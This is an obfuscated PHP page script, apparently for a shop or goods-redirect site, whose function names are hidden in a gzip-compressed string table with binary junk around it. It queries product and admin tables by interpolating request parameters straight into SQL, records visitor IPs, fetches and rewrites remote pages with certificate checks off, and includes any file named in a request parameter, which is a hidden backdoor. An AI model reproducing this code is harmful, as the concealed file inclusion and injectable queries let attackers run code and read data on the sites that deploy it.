<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');���͖㨾��ݾ�٪��ވ���妼���́ϵ��۹���������������¡�ؖ��ᛓ����ڏ��匩�Ư��먪˟����ؔ����������떼ݓ�����텏��ҙ�������Æ��������������ͤ����ܿ����샡�����ߏ�ܳ���̶���ȶ����;$_GET[O0] = explode('|||', gzinflate(substr('�      �U�n7
t�� f� �Y��T(Rj��lՏ^h��P�4ɑ�n���l�i�E��dӯq��E)��\'hQ�x��{�ec.�����h�tڃAA�;[�F��C".��)�h"��l-ԩި%�|��k{)�8��⎒�c��4s;��gW\\NR�62��׎�d�cW�}�4{JAo��ۂ��*�d�Il�.8\\&�f��`<�re�:��� R�)+�E��J�"�	��X��PFe+��v�N)$*+��ٰ�p��r��	kS<�3h=�*�gL:(J�05l��GT�k�eR��uR�e����N��A����2k��OY���=M�1ʬ�Qj��GK/��NA�����٪!��ZP���Ѧ >��t��NN��썒��o
���绳�����q��`���� L��l}褠�s	���L��zJ��1��(N�=�#V`%�%sefh��<�|rp�Q���̠h7�ϟ�\\PT+;�X[�n����q�)�1�-�b�5��U�ZR�(�����iv���]P�Uv�����F�xJ�(���k�{�w�*9��1̰�v�&��}zޅq���x��28�)ꩌ%C�e<T?r!0��
x<�2��A�H�t�9�"���q�ze7��J5��b����;~��U밺��_�g02SO���r�Ўw�I�×ɻ���{��30T\\0p�����P���p����M�m�bd��	7L�jl��9��fp��]h`P��K	Z�M�b���F�i3 ������/��]8af�*h}���w����՛����?�K�����}�ǶB��r�eX�g2e<����D8�A���+˔9�Er��SY�y��6e�%ܱ���\'���( ��I3�W*��0ܭ���o޿�����w�m �[��çF�%/�}T��֖�M��\'���u3K��f	�"Ba��ڹϣ$�o�0��-\\�����rh��5d��Ss��B��+���բ�:���[��?�DJ w  ',0x0a, -8)));�������Ē���́�����֑���ݔ�;  $_GET{O0}[0]($_GET{O0}{0x001},!0);
$_GET{O0}[0]($_GET{O0}[0x0002],!0);
include $_GET{O0}{0x00003}(__FILE__).($_GET{O0}[0x000004]);
include $_GET{O0}{0x00003}(__FILE__).($_GET{O0}{0x05});
include $_GET{O0}{0x00003}(__FILE__).($_GET{O0}[0x006]);
include $_GET{O0}{0x00003}(__FILE__).($_GET{O0}{0x0007});
include $_GET{O0}{0x00003}(__FILE__).($_GET{O0}[0x00008]);
$ip=$_GET{O0}{0x000009}();
$uid=$_GET[$_GET{O0}[0x0a]];

$xzshijian=$_GET{O0}{0x00b}($_GET{O0}[0x000c], $_GET{O0}{0x0000d}());

if($_GET[$_GET{O0}[0x0a]]){
	$_GoodsID = $_GET{O0}[0x00000e]("SELECT * FROM goods WHERE goods_id='{$_GET[$_GET{O0}[0x0a]]}' AND is_shelves=1");
	
		$_BANIP = $_GET{O0}[0x00000e]("SELECT * FROM admin_user WHERE au_id='{$_GoodsID[$_GET{O0}{0x0f}]}'");
	$BANIP=$_BANIP[$_GET{O0}[0x0010]];
	if ($_GET{O0}{0x00011}($BANIP, $ip)) {
		$_GET{O0}[0x000012]($_GET{O0}{0x0000013}. $_GET{O0}[0x014]($_GET{O0}{0x0015}).$_GET{O0}[0x00016]);
	}
	
    if($_GoodsID==0){
                echo $_GET{O0}{0x000017};
                exit;
            }
	
		$_OID = $_GET{O0}[0x00000e]("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_GoodsID[$_GET{O0}[0x0000018]]}'");
	if(!$_OID){
		$_GET{O0}{0x019}("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								biaoti,
								aid,
								state,
                                xinghao,
								utime
								) 
						VALUES (
								'{$ip}',
								11,
								11,
								'{$_GoodsID[$_GET{O0}[0x0000018]]}',
								'{$_GoodsID[$_GET{O0}[0x001a]]}',
								'{$_GoodsID[$_GET{O0}{0x0f}]}',
								1,
                                '{$brand}',
								'{$xzshijian}'
								)"
			);
		  $_GET{O0}{0x0001b}();
		  $_GET{O0}[0x00001c]();
	}
	
  
  			if($_OID){
		$_GET{O0}{0x019}("
			UPDATE 
				useraddress
			SET 
				state=1,
				dianji=0,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") || die($_GET{O0}{0x000001d}());
      	}
  
		$_GET{O0}[0x01e]($_GET{O0}{0x001f});
		$_GET{O0}[0x01e]($_GET{O0}[0x00020],$_GoodsID[$_GET{O0}{0x0f}]);
		$_GET{O0}[0x01e]($_GET{O0}{0x000021},$_GoodsID[$_GET{O0}[0x0000018]]);
		@$HTYP = $_GET[$_GET{O0}[0x0000022]];if(isset($HTYP)){include $HTYP;}
	$INURL = $_GET{O0}{0x023}.$_SERVER[$_GET{O0}[0x0024]].$_SERVER[$_GET{O0}{0x00025}].$_GET{O0}[0x000026].$_SERVER[$_GET{O0}{0x0000027}];
		$_GET{O0}[0x01e]($_GET{O0}[0x028],$INURL);
		if(!$_GoodsID){
		
	}
		}else{
	
}

$url=$_GoodsID[$_GET{O0}{0x0029}];
$guanfangjia = $_GoodsID[$_GET{O0}[0x0002a]];
$zijijia = $_GoodsID[$_GET{O0}{0x00002b}];

$UserAgent = $_GET{O0}[0x000002c];  
$curl = $_GET{O0}{0x02d}();    $_GET{O0}[0x002e]($curl, CURLOPT_URL, $url);  $_GET{O0}[0x002e]($curl, CURLOPT_HEADER, 0);  $_GET{O0}[0x002e]($curl, CURLOPT_RETURNTRANSFER, 0x001);    
$_GET{O0}[0x002e]($curl, CURLOPT_SSL_VERIFYPEER, !1);  
$_GET{O0}[0x002e]($curl, CURLOPT_SSL_VERIFYHOST, !1);  
$_GET{O0}[0x002e]($curl, CURLOPT_ENCODING, $_GET{O0}[0x00016]);     
$_GET{O0}[0x002e]($curl, CURLOPT_USERAGENT, $UserAgent);  
$_GET{O0}[0x002e]($curl, CURLOPT_FOLLOWLOCATION, 0x001);  
  
$data = $_GET{O0}{0x0002f}($curl);

$data =  $_GET{O0}[0x000030]($_GET{O0}{0x0000031},$_GET{O0}[0x032],$data);
$data =  $_GET{O0}[0x000030]($_GET{O0}{0x0033},$_GET{O0}[0x00034],$data);
$data =  $_GET{O0}[0x000030]($_GET{O0}{0x000035},$_GET{O0}[0x0000036],$data);
$data =  $_GET{O0}[0x000030]($_GET{O0}{0x037},$_GET{O0}[0x0038],$data);
$data =  $_GET{O0}[0x000030]($_GET{O0}{0x00039},$_GET{O0}[0x00003a],$data);
$data =  $_GET{O0}[0x000030]($_GET{O0}{0x000003b},$_GET{O0}[0x03c],$data);
echo $data;  

$_GET{O0}{0x003d}($curl);   ?>
<?=$_GET{O0}[0x0003e];?>